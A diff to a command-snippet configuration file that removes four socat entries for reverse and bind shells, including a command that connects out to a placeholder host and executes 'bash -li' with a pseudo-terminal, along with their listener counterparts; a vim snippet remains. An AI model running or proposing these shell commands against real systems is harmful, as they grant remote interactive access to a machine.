@@ -24,26 +24,6 @@
   output = ""
 
 [[snippets]]
-  description = "reverse shell socat remote"
-  command = "socat TCP:<local-ip>:<local-port> EXEC:\"bash -li\",pty,stderr,sigint,setsid,sane"
-  output = ""
-
-[[snippets]]
-  description = "reverse shell socat local"
-  command = "socat TCP-L:<local-port> -"
-  output = ""
-
-[[snippets]]
-  description = "bind shell socat target"
-  command = "socat TCP-L:<local-port> EXEC:\"bash -li\""
-  output = ""
-
-[[snippets]]
-  description = "bind shell socat local"
-  command = "socat TCP:<target-ip>:<target-port> -"
-  output = ""
-
-[[snippets]]
   description = "vim"
   command = "vim -p -c 'set ignorecase smartcase wildignorecase tabstop=2 softtabstop=2 shiftwidth=2 expandtab paste' "
   output = ""
